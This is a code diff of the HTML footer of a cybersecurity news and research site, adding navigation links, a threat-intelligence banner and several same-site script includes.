+                        <li><a href="/articles.html">Research Library</a></li>
+                        <li><a href="/cve-tracker.html">CVE Alerts</a></li>
+                        <li><a href="/guides/">Security Guides</a></li>
+                        <li><a href="/comparisons/">Tool Comparisons</a></li>
+                        <li><a href="/about.html">About</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Security Tools</h4>
+                    <ul class="footer-links">
+                        <li><a href="/threat-intel.html">Threat Intelligence</a></li>
+                        <li><a href="/cve-tracker.html">CVE Triage Workbench</a></li>
+                        <li><a href="/ransomware-tracker.html">Ransomware Tracker</a></li>
+                        <li><a href="/hacker-chatter.html">Hacker Chatter</a></li>
+                        <li><a href="/tools/grc-assessment/">ISO 27001 GRC Tool</a></li>
+                        <li><a href="/workflows/">n8n Workflows</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Publication</h4>
+                    <ul class="footer-links">
+                        <li><a href="/about.html">Editorial Standards</a></li>
+                        <li><a href="/rss.xml">RSS Feed</a></li>
+                        <li><a href="/privacy.html">Privacy Policy</a></li>
+                        <li><a href="/contact.html">Contact Editorial</a></li>
+                    </ul>
+                </div>
+
+                <div class="footer-col">
+                    <h4>Recent Research</h4>
+                    <ul class="footer-links">
+                        <li><a href="/articles/beyond-the-headlines-cybersecurity-incident-readiness-2026.html">Incident Readiness Playbook</a></li>
+                        <li><a href="/articles/forticlient-ems-zero-day-cve-2026-35616.html">FortiClient EMS Zero-Day CVE</a></li>
+                        <li><a href="/articles/emudhra-ca-key-entropy-failure-2026.html">eMudhra WebPKI Entropy Failure</a></li>
+                    </ul>
+                </div>
+            </div>
+
+            <div class="footer-live-intel">
+                <div class="footer-live-intel-info">
+                    <span class="footer-live-badge">Live</span>
+                    <strong>CYBER THREAT INTELLIGENCE PLATFORM</strong>
+                    <span class="footer-live-text">Automated IoC aggregation updated every 4 hours across ThreatFox, URLhaus, and Feodo Tracker.</span>
+                </div>
+                <a href="/threat-intel.html" class="footer-live-link">View Live Dashboard &rarr;</a>
+            </div>
+
+            <div class="footer-bottom">
+                <p>&copy; 2026 TheHGTech. All rights reserved. Independent Cybersecurity Research &amp; Field Manuals.</p>
+            </div>
+        </div>
     </footer>
-<script src="../ui-enhancements.js?v=20260517" defer></script>
 
+    <!-- Core Site & Article Reader Scripts -->
+    <script src="/header-dropdown.min.js" defer></script>
     <script src="/command-palette.js" defer></script>
     <script src="/mobile-nav.js" defer></script>
+    <script src="/theme-toggle.js" defer></script>
+    <script src="/interaction-bar.min.js?v=20260623" defer></script>
+    <script src="/js/article-editorial.js?v=1.0" defer></script>
 </body>
 
 </html>
